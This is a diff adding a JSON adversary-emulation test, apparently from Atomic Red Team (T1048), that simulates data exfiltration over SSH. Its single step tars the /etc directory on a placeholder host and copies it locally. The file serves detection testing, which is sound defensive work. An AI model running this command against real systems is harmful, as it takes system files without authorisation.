@@ -1,0 +1,32 @@
+{
+  "id": "f6786cc8-beda-4915-a4d6-ac2f193bb988",
+  "name": "Exfiltration Over Alternative Protocol - SSH",
+  "description": "Input a domain and test Exfiltration over SSH\n\nRemote to Local\n\nUpon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.\n",
+  "platforms": [
+    "darwin",
+    "linux"
+  ],
+  "steps": [
+    {
+      "id": "04594b8a-4708-4fb0-8af4-b3e53fbcbb5d",
+      "type": "execute-command",
+      "data": {
+        "command": "ssh #{domain} \"(cd /etc \u0026\u0026 tar -zcvf - *)\" \u003e ./etc.tar.gz\n",
+        "command_type": "sh"
+      },
+      "elevation_required": false
+    }
+  ],
+  "tags": [
+    "T1048",
+    "atomic-red-team"
+  ],
+  "input_arguments": [
+    {
+      "name": "domain",
+      "type": "url",
+      "description": "target SSH domain",
+      "value": "target.example.com"
+    }
+  ]
+}
